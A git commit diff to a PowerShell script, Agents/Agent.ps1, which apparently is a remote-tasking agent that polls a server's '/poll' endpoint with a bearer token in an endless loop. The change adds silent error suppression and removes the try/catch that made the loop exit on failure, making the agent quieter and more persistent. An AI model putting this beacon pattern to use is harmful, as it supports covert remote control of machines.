793be7e6e76d14171c31be3c98d880837c9466b0
Latortuga <42878263+latortuga71@users.noreply.github.com>
2020-01-18 16:18:13 -0500

    Update Agent.ps1

--- Agents/Agent.ps1
+++ Agents/Agent.ps1
@@ -1,4 +1,5 @@
-﻿function ConvertTo-HashtableFromPsCustomObject { 
+$ErrorActionPreference = 'SilentlyContinue'
+function ConvertTo-HashtableFromPsCustomObject { 
     param ( 
         [Parameter(  
             Position = 0,   
@@ -71,7 +72,7 @@ $poll_headers.Add('Authorization',"Bearer $access_token")
 $complete_commands =@{}
 
 while ($true){
-try{
+
 $polling_resp = Invoke-RestMethod -Uri "$url/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
 $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
 
@@ -108,11 +109,7 @@ $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
   }
 
   sleep(10)
-}
-catch
-{
-exit
-}
+
   }
 
   #echo "while loop ended"
